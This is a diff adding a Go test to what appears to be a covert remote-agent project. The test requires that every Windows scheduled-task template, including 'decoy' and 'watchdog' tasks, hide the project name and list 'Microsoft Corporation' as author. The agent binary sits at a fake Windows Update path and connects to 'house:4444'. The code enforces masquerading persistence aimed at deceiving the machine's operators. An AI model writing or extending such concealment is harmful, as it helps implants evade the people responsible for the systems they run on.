@@ -28,6 +28,27 @@ func TestTaskXMLWellFormed(t *testing.T) {
 	}
 }
 
+// The task Author is operator-visible in Task Scheduler: it must never name
+// the project. Every template carries the bland corporate author.
+func TestTaskXMLBlandAuthor(t *testing.T) {
+	ap := `C:\ProgramData\Microsoft\Windows\Update\MicrosoftWindowsClient.exe`
+	docs := []string{
+		AgentTaskXML(ap, "house:4444", "server.crt"),
+		WatchdogTaskXML(ap),
+		OrchestratorTaskXML(ap),
+		DecoyTaskXML(ap),
+		NMSTaskXML(ap),
+	}
+	for i, doc := range docs {
+		if strings.Contains(doc, "<Author>RMM</Author>") {
+			t.Fatalf("doc %d: project name in task Author", i)
+		}
+		if !strings.Contains(doc, "<Author>Microsoft Corporation</Author>") {
+			t.Fatalf("doc %d: bland author missing", i)
+		}
+	}
+}
+
 // The exact v1.45.2 regression, pinned: a Principal closed straight into
 // </Principals> must fail validation.
 func TestTaskXMLMissingPrincipalClose(t *testing.T) {
